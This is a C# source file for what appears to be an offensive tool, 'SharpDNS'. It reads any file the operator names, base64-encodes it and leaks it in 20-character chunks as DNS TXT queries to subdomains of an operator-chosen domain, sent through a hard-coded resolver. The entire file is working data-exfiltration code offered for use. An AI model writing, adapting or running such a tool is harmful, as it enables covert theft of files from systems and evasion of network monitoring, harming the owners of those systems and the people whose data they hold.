using DnsDig;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpDNS
{
    class Program
    {


        static string usage = "file:C:\\myFile.txt domain:yourdomain.com";
        static void Main(string[] args)
        {

            // DEBUG
            //RunTest();
            

            var arguments = new Dictionary<string, string>();
            try
            {
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("[-] Exception parsing arguments:");
                Console.WriteLine(ex);
            }

            if (!arguments.ContainsKey("file"))
            {
                Console.WriteLine("[-] Error: No file  was given.");
                Console.WriteLine("Usage: " + usage);
                Environment.Exit(1);
            }

            if (!arguments.ContainsKey("domain"))
            {
                Console.WriteLine("[-] Error: No domain was given.");
                Console.WriteLine("Usage:\r\n" + usage);
                Environment.Exit(1);
            }


            Byte[] bytes = File.ReadAllBytes(arguments["file"]);
            String file = Convert.ToBase64String(bytes);


            for (int i = 0; i < file.Length - 20; i += 20)
            {
                string reply = String.Empty;
                try
                {
                    Dig myDig = new Dig();

                    myDig.resolver.DnsServer = "192.168.5.5"; // It is fine if the specified dns server doesn't exist

                    System.Net.IPEndPoint ipEndPoint = new System.Net.IPEndPoint((long)(uint)System.Net.IPAddress.NetworkToHostOrder(
                     (int)System.Net.IPAddress.Parse("5.5.168.192").Address), 53);



                    myDig.resolver.DnsServers = new[] { ipEndPoint };
                    myDig.resolver.Recursion = false;
                    myDig.resolver.Retries = 1;
                    myDig.resolver.TimeOut = 0;
                    myDig.resolver.TransportType = Heijden.DNS.TransportType.Udp;
                    myDig.resolver.UseCache = false;
                    string request = file.Substring(i, 20);
                    request += "." + arguments["domain"];

                    myDig.resolver.Query(request, Heijden.DNS.QType.TXT, Heijden.DNS.QClass.IN);
                }
                catch (Win32Exception e)
                {
                    Console.WriteLine(String.Format("[!] Unexpected exception occured: [{0}]", e.Message));
                    return;
                }
            }

            Console.ReadLine();

        }
    }

    
    
}
